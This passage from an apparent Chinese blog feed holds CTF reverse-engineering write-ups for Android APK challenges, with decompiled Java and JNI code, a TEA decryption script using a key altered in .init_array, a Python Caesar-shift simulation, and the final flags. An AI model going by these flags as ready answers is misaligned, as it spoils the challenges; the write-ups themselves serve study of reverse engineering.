<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;29&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;10&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.myapplication&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;29&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;29&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>主函数就是调用了JNI</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes2.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button mBtnLogin;</span><br><span class="line">    <span class="keyword">private</span> EditText mEtflag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0273R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.mBtnLogin = (Button) findViewById(C0273R.C0275id.btn_login);</span><br><span class="line">        <span class="built_in">this</span>.mEtflag = (EditText) findViewById(C0273R.C0275id.bEn_edittext);</span><br><span class="line">        <span class="built_in">this</span>.mBtnLogin.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.example.myapplication.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">MainActivity</span> <span class="variable">mainActivity</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;</span><br><span class="line">                <span class="keyword">if</span> (mainActivity.check(mainActivity.mEtflag.getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;You Are Right!flag is flag&#123;md5(input)&#125;&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;Sorry your flag is wrong!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>JNI函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">Java_com_example_myapplication_MainActivity_check</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+24h] [xbp-4Ch]</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// [xsp+4Ch] [xbp-24h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">24</span>]; <span class="comment">// [xsp+50h] [xbp-20h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [xsp+68h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  sub_3FE20(a1, a3, (__int64)v6);<span class="comment">//复制字符串</span></span><br><span class="line">  <span class="keyword">if</span> ( sub_40040((__int64)v6) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">      byte_C80E0[i] = *(_BYTE *)sub_40064((__int64)v6, i);</span><br><span class="line">    v5 = sub_3ED8C((<span class="type">unsigned</span> <span class="type">int</span> *)byte_C80E0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_3FC04((__int64)v6);</span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>为啥反编译不一样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306231819094.png"
                      alt="image-20230623181955999"
                ></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">bool __fastcall <span class="title function_">sub_3ED8C</span><span class="params">(unsigned <span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="type">int</span> i; <span class="comment">// [xsp+20h] [xbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [xsp+24h] [xbp-1Ch]</span></span><br><span class="line">  unsigned <span class="type">int</span> v4; <span class="comment">// [xsp+28h] [xbp-18h]</span></span><br><span class="line">  unsigned <span class="type">int</span> v5; <span class="comment">// [xsp+2Ch] [xbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v5 = *a1;</span><br><span class="line">  v4 = a1[<span class="number">1</span>];</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 += dword_C8010;</span><br><span class="line">    v5 += (<span class="number">16</span> * v4 + dword_C8000) ^ (v4 + v3) ^ ((v4 &gt;&gt; <span class="number">5</span>) + dword_C8004);</span><br><span class="line">    v4 += (<span class="number">16</span> * v5 + dword_C8008) ^ (v5 + v3) ^ ((v5 &gt;&gt; <span class="number">5</span>) + dword_C800C);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> *a1 == <span class="number">0xF5A98FF3</span> &amp;&amp; a1[<span class="number">1</span>] == <span class="number">0xA21873A3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过交叉引用发现有对key的修改key为{9,7,8,6}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306231822092.png"
                      alt="image-20230623182220976"
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_3EF18</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  dword_C8004 = <span class="number">7</span>;</span><br><span class="line">  dword_C8008 = <span class="number">8</span>;</span><br><span class="line">  dword_C800C = <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>有个自启动的函数对值进行修改，自启动的一般都在.init_array表内</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">.init_array:<span class="number">00000000000</span>C0F98 ; Segment type: Pure data</span><br><span class="line">.init_array:<span class="number">00000000000</span>C0F98                 AREA .init_array, DATA, ALIGN=<span class="number">3</span></span><br><span class="line">.init_array:<span class="number">00000000000</span>C0F98                 ; ORG <span class="number">0xC0F98</span></span><br><span class="line">.init_array:<span class="number">00000000000</span>C0F98 off_C0F98       DCQ sub_3EF3C           ; DATA XREF: LOAD:<span class="number">0000000000000088</span>↑o</span><br><span class="line">.init_array:<span class="number">00000000000</span>C0F98                                         ; LOAD:<span class="number">00000000000001</span>D8↑o</span><br><span class="line">.init_array:<span class="number">00000000000</span>C0F98 ; .init_array   ends</span><br><span class="line">.init_array:<span class="number">00000000000</span>C0F98</span><br></pre></td></tr></table></figure></div>

<p>直接用之前写的tea算法</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">teajiami</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> <span class="comment">//此处uint32长度就为usigned int占32bit共4个字节</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;  <span class="comment">// 注意sum也是32位无符号整型</span></span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x458BCD42</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) <span class="comment">//进行32轮迭代，次数越多越难破解，但同时效率也会降低</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0; </span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">teajiemi</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> <span class="comment">//解密也是进行相同的异或操作，通过异或同一个数恢复原数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x458BCD42</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0; </span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 两个32位无符号整数，即待加密的64bit明文数据</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0xF5A98FF3</span>, <span class="number">0xA21873A3</span>&#125;;</span><br><span class="line">    <span class="comment">// 四个32位无符号整数，即128bit的key</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>]= &#123;<span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0x6</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;Data is : %x %x\n&quot;, v[0], v[1]);</span></span><br><span class="line">    <span class="comment">// teajiami(v, k);</span></span><br><span class="line">    <span class="comment">// printf(&quot;Encrypted data is : %x %x\n&quot;, v[0], v[1]);</span></span><br><span class="line">    teajiemi(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">puts</span>((<span class="type">char</span>*)v);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306231838820.png"
                      alt="image-20230623183849786"
                ></p>
<p>直接用md5</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306231839145.png"
                      alt="image-20230623183945049"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>SWPU 2019ThousandYearsAgo</title>
    <url>/2023/06/08/CTF%20WP/Re/%E5%AE%89%E5%8D%93/SWPU%202019ThousandYearsAgo/</url>
    <content><![CDATA[<p>先分析下Manifest.xml</p>
<p>只有一个activity组件</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;29&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;10&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.thousandyearsago&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;29&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;15&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;29&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.thousandyearsago.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.thousandyearsago;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1000000000</span>;</span><br><span class="line">    <span class="keyword">private</span> Handler handler;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">StringFromJNI</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.handler = <span class="keyword">new</span> <span class="title class_">Handler</span>();</span><br><span class="line">        <span class="type">Button</span> <span class="variable">btn</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">        btn.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        <span class="built_in">this</span>.handler.postDelayed(r, <span class="number">1000000000L</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.button) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;好像卡死了啊！！！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Inner</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        Inner() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1000000000</span> &lt;= <span class="number">1000000</span>) &#123;</span><br><span class="line">                <span class="type">MainActivity</span> <span class="variable">mainActivity</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;</span><br><span class="line">                Toast.makeText(mainActivity, mainActivity.StringFromJNI(), <span class="number">1</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过动态调试得到提示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306090053824.png"
                      alt="image-20230609005321505"
                ></p>
<p>其调用了native类的StringFromJNI函数（下方的函数）</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Java_com_example_thousandyearsago_MainActivity_stringFromJNI</span><span class="params">(_JNIEnv *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+2Ch] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">43</span>]; <span class="comment">// [esp+31h] [ebp-2Bh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(dest, <span class="string">&quot;flag&#123;WeLcome_to-SWPU&#125;&#125;&quot;</span>, <span class="number">0x17</span>u);</span><br><span class="line">  v3 = (<span class="type">char</span> *)decode(dest, <span class="number">5</span>);</span><br><span class="line">  MD5Final(v3);</span><br><span class="line">  v1 = (<span class="type">const</span> <span class="type">char</span> *)decode(dest, <span class="number">5</span>);</span><br><span class="line">  <span class="keyword">return</span> _JNIEnv::NewStringUTF(a1, v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/********************decode*************************/</span></span><br><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">decode</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+20h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] &lt; <span class="number">65</span> || a1[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1[i] &gt;= <span class="number">97</span> &amp;&amp; a1[i] &lt;= <span class="number">122</span> )</span><br><span class="line">        a1[i] = (a2 + a1[i] - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a1[i] = (a2 + a1[i] - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>decode不是解码吗，怎么就变成加密了（有点被误导了）</p>
<p>用python模拟了下decode的过程</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">input</span>()</span><br><span class="line">b=[<span class="number">0</span>]*<span class="number">40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    b[i]=<span class="built_in">ord</span>(a[i])</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ord</span>(a[i])&lt;<span class="number">65</span> <span class="keyword">or</span> <span class="built_in">ord</span>(a[i])&gt;<span class="number">90</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">ord</span>(a[i])&gt;=<span class="number">97</span> <span class="keyword">and</span> <span class="built_in">ord</span>(a[i])&lt;=<span class="number">122</span>):</span><br><span class="line">            b[i]=(<span class="number">5</span>+<span class="built_in">ord</span>(a[i])-<span class="number">97</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        b[i]=(<span class="number">5</span>+<span class="built_in">ord</span>(a[i])-<span class="number">65</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(b).decode())</span><br><span class="line"><span class="comment">#a=flag&#123;WeLcome_to-SWPU&#125;&#125;</span></span><br><span class="line"><span class="comment">#flag就是kqfl&#123;BjQhtrj_yt-XBUZ&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>没遇到过里面带大括号的flag，看了别人wp才知道得把kqfl{BjQhtrj_yt-XBUZ}}也用大括号包起来</p>
<p>flag就是flag{kqfl{BjQhtrj_yt-XBUZ}}} 非常奇特</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>ez_baby_apk</title>
    <url>/2023/03/25/CTF%20WP/Re/%E5%AE%89%E5%8D%93/ez_baby_apk/</url>
    <content><![CDATA[<p>ez_baby_apk</p>
<p>主方法</p>
